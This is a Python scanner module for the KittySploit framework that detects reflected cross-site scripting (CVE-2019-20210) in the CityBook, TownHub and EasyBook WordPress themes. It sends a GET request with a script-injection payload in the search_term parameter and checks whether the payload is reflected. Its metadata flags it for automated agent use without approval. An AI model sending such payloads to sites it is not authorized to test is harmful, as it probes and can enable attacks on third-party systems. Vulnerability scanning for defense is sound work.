#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress CTHthemes CityBook before 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress CTHthemes - Cross-Site Scripting Detection',
        'description': 'WordPress CTHthemes CityBook before 2.3.4, TownHub before 1.0.6, and EasyBook before 1.2.2 themes contain reflected cross-site scripting vulnerabilities via a search query.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'wp-theme', 'wpscan', 'wordpress', 'citybook', 'xss', 'cththemes', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/10013',
            'https://wpvulndb.com/vulnerabilities/10018',
            'https://cxsecurity.com/issue/WLB-2019120112',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-20210',
            'https://themeforest.net/item/citybook-directory-listing-wordpress-theme/21694727',
        ],
        'cve': 'CVE-2019-20210',
    }

    def run(self):
        r = self.http_request(method="GET", path='/?search_term=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&location_search=&nearby=off&address_lat=&address_lng=&distance=10&lcats%5B%5D=', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('</script><script>alert(document.domain)</script>', '/wp-content/themes/citybook',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="WordPress CTHthemes - Cross-Site Scripting detected",
                path='/?search_term=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&location_search=&nearby=off&address_lat=&address_lng=&distance=10&lcats%5B%5D=',
            )
            return True
        return False

